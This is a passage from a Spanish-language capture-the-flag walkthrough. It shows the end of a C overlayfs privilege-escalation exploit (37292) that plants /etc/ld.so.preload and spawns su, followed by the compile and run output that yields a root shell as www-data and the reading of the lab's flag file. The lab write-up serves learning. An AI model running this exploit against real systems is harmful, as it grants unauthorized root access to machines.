
lib = system("cc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");

if(lib != 0) {

fprintf(stderr,"couldn't create dynamic library\n");

exit(-1);

}

write(fd,"/tmp/ofs-lib.so\n",16);

close(fd);

system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");

execl("/bin/su","su",NULL);

}
```

Compilamos, damos permisos de ejecución y lo corremos.

```bash
www-data@ubuntu:/dev/shm$ cc 37292.c -o privesc.out
37292.c:91:1: warning: control may reach end of non-void function [-Wreturn-type]
}
^
37292.c:103:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
        if(unshare(CLONE_NEWUSER) != 0)
           ^
37292.c:108:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                ^
37292.c:114:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
            waitpid(pid, &status, 0);
            ^
37292.c:124:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
    wait(NULL);
    ^
5 warnings generated.
www-data@ubuntu:/dev/shm$ chmod +x privesc.out 
www-data@ubuntu:/dev/shm$ ./privesc.out 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
# 
```

Ya somos el usuario **root** y podemos visualizar la flag (flag.txt).

```bash
# cd /root
# ls -la
total 44
drwx------  3 root root 4096 Apr 29  2018 .
drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
-rw-r--r--  1 root root   19 May  3  2018 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
drwx------  2 root root 4096 Apr 28  2018 .cache
-rw-------  1 root root  144 Apr 29  2018 .flag.txt
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-------  1 root root 1024 Apr 23  2018 .rnd
-rw-------  1 root root 8296 Apr 29  2018 .viminfo
# cat .flag.txt
Alec told me to place the codes here: 

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/

#
```
